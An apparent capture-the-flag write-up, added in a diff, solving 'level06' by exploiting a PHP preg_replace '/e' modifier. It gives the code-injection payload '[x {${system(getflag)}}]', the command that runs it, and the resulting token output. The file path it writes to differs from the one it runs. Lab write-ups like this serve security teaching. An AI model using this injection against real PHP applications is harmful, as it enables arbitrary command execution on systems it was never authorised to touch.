@@ -1,0 +1,20 @@
+Here, we heve 2 files: level06 and level06.php
+If you try to exec level06, you see that it'll use level06.php and want file as argument
+After some tries, we can see that it will print what's inside this file.
+In one of the preg_replace of the php file, there is a "/e", which will execute a function inside the regex
+The regex is: (\[x (.*)\])
+
+We will have to write our exploit like this : [x FUNCTION]
+and the function we will need is: {${system(getflag)}}
+note: {${FUNCTION}} will allow us to get the return of the function
+
+So, what we need to put in a file like /tmp/getflag is:
+[x {${system(getflag)}}]
+
+After that, we just need to execute the level06 with our new file:
+./level06 /tmp/test
+
+And we have:
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
